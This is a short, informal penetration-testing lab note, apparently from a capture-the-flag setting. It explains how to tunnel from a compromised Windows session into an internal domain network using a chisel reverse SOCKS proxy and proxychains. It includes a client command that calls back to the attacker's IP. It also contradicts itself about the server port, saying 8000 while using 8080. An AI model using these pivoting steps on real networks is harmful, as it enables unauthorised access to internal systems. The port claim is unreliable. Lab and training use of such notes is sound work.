u wanna connect to the internal services from the kali??
let's do chiselling here:

transfer the chisel file from kali to the powershell seession or whatever session, then start a chisel server in ur kali:
```bash
sudo chisel server -p 8080 --reverse
```

using 8000 cuase the bloodhound uses 8080 when booting so no *conflict*

then just start a chisel client inside the session :
```powershell
C:\Windows\Temp\chisel.exe client 10.10.14.7:8080 R:socks
```

make sure the proxychains conf `/etc/proxychains4.conf` has this 
**socks5 127.0.0.1 1080**
now u can run any command from ur kali with **proxychains4** in the start of teh command and connect to the internal services of the domain servers

```note
also keep note that doing nmap with -sn wont work cause pinging doesnt work with socks proxy
```

